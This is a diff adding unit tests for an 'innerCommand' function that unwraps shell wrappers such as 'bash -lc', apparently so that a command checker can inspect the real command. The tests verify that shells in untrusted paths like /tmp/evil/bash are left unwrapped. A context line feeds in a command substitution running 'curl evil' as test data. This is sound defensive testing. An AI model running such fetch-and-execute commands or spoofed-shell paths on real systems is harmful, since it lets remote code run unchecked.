@@ -52,4 +52,23 @@ describe('innerCommand', () => {
     // Unreadable to shellWords: it is returned whole, never guessed at.
     expect(innerCommand('bash -lc "$(curl evil)"')).toBe('bash -lc "$(curl evil)"');
   });
+
+  test('unwraps a shell only by its name or from a directory of the system', () => {
+    expect(innerCommand('/usr/bin/bash -lc "npm ci"')).toBe('npm ci');
+    expect(innerCommand('/opt/homebrew/bin/bash -lc "npm ci"')).toBe('npm ci');
+    expect(innerCommand('/usr/local/bin/zsh -c "npm ci"')).toBe('npm ci');
+    expect(innerCommand('dash -c "npm ci"')).toBe('npm ci');
+    // A shell from anywhere else is the program that runs: the script is only what it is handed.
+    for (const command of [
+      "/tmp/evil/bash -lc 'npm test'",
+      "/Users/me/Downloads/sh -c 'npm test'",
+      "./bash -lc 'npm test'",
+      "bin/zsh -c 'npm test'",
+    ]) {
+      expect(innerCommand(command)).toBe(command);
+    }
+    // Words that merely end in "sh" are no shells: ssh -c names a cipher.
+    expect(innerCommand("ssh -c 'npm test'")).toBe("ssh -c 'npm test'");
+    expect(innerCommand("fish -c 'npm test'")).toBe("fish -c 'npm test'");
+  });
 });
